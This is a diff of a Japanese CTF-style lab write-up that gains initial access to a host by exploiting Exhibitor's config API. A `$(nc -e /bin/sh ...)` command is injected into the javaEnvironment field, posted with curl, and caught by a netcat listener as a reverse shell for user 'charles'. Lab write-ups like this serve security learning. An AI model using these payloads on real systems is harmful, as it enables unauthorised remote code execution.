@@ -78,37 +78,23 @@ Exploit-DB:
 ```text
 https://www.exploit-db.com/exploits/48654
 ```
-
-このExploitでは、`java.env` スクリプトを利用してコマンドを実行します。
-
-今回、`java.env` に以下の内容を設定しました。
-
-```bash
-$(/bin/nc -e /bin/sh 192.168.45.202 4444 &)
+```
+└─$ cat data.json                                                                
+{ "zookeeperInstallDirectory": "/opt/zookeeper", "zookeeperDataDirectory": "/zookeeper/data", "zookeeperLogDirectory": "/opt/zookeeper/transactions", "logIndexDirectory": "/opt/zookeeper/transactions", "autoManageInstancesSettlingPeriodMs": "0", "autoManageInstancesFixedEnsembleSize": "0", "autoManageInstancesApplyAllAtOnce": "1", "observerThreshold": "0", "serversSpec": "1:pelican", "javaEnvironment": "$(/bin/nc -e /bin/sh 192.168.45.158 8080 &)", "log4jProperties": "", "clientPort": "2181", "connectPort": "2888", "electionPort": "3888", "checkMs": "30000", "cleanupPeriodMs": "300000", "cleanupMaxFiles": "20", "backupPeriodMs": "600000", "backupMaxStoreMs": "21600000", "autoManageInstances": "1", "zooCfgExtra": { "tickTime": "2000", "initLimit": "10", "syncLimit": "5", "quorumListenOnAllIPs": "true" }, "backupExtra": { "directory": "" }, "serverId": 2 }
+```
+```
+└─$ curl -X POST -d @data.json http://192.168.197.98:8080/exhibitor/v1/config/set
+{"message":"OK","succeeded":true}         
 ```
 
-Kali側でリスナーを起動します。
-
-```bash
-nc -lvnp 4444
 ```
-
-ターゲットから接続され、
-
-```text
-listening on [any] 4444 ...
-connect to [192.168.45.202] from (UNKNOWN) [192.168.129.98] 55362
-```
-
-シェルを確認します。
-
-```bash
+└─$ nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [192.168.45.158] from (UNKNOWN) [192.168.197.98] 40534
 whoami
-```
-
-```text
 charles
 ```
+
 
 初期アクセスとして `charles` ユーザーのシェルを取得できました。
 
